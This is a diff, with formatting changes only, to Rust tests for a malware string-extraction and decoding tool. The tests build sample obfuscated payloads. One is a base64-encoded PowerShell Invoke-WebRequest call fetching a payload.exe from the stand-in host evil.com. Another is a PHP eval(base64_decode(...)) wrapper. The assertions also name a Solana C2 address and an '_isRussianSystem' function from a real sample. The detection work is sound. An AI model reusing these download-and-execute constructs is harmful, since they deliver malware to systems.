@@ -381,7 +381,8 @@ fn powershell_encode_command(cmd: &str) -> String {
 
 #[test]
 fn test_powershell_encoded_command() {
-    let encoded = powershell_encode_command("Invoke-WebRequest -Uri 'https://evil.com/payload.exe'");
+    let encoded =
+        powershell_encode_command("Invoke-WebRequest -Uri 'https://evil.com/payload.exe'");
     let src = format!("powershell.exe -EncodedCommand {encoded}\n");
 
     let opts = ExtractOptions::new(4);
@@ -432,8 +433,7 @@ Invoke-Expression $cmd
     assert!(
         strings
             .iter()
-            .any(|s| s.method == StringMethod::ScriptDecode
-                && s.value.contains("Stop-Process")),
+            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("Stop-Process")),
         "Should decode [Convert]::FromBase64String and find 'Stop-Process'"
     );
 }
@@ -545,9 +545,7 @@ fn test_classification_of_decoded_content() {
     // The decoded payload should be classified by the IOC classifier
     let payload = "https://evil.com/payload.exe";
     let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
-    let src = format!(
-        r#"<?php eval(base64_decode("{encoded}")); ?>"#
-    );
+    let src = format!(r#"<?php eval(base64_decode("{encoded}")); ?>"#);
 
     let opts = ExtractOptions::new(4).with_garbage_filter(true);
     let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);
@@ -596,7 +594,8 @@ fn test_real_world_tahmin_uygulamasi() {
     assert!(
         strings.iter().any(|s| {
             s.method == StringMethod::ScriptDecode
-                && s.value.contains("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")
+                && s.value
+                    .contains("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")
         }),
         "Should find Solana C2 address in decoded payload. Found {} ScriptDecode strings",
         script_decoded.len()
@@ -614,8 +613,7 @@ fn test_real_world_tahmin_uygulamasi() {
     // Should find suspicious function names
     assert!(
         strings.iter().any(|s| {
-            s.method == StringMethod::ScriptDecode
-                && s.value.contains("_isRussianSystem")
+            s.method == StringMethod::ScriptDecode && s.value.contains("_isRussianSystem")
         }),
         "Should find _isRussianSystem function in decoded payload"
     );
